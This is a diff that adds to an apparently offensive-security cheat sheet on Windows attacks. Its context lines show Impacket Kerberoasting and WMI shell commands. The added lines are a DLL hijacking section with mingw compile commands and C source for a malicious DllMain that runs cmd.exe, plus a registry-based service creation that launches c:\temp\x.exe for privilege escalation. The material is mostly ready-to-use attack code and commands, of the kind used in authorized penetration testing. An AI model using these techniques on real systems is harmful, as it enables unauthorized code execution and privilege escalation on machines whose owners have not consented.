@@ -290,3 +290,29 @@ GetUserSPNs.py <domain>/<username> -dc-ip <ipaddr> -request
 Shell Execution through wmi
 wmiexec.py <domain>/<username>:<password>@<ipaddr>
 ```
+
+### [Dll Hijacking]
+```
+# compile a malicious dll
+- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+
+Dll Hijacking
+
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
+### [Creating service in registry]
+```
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+
+sc start regsvc
+```
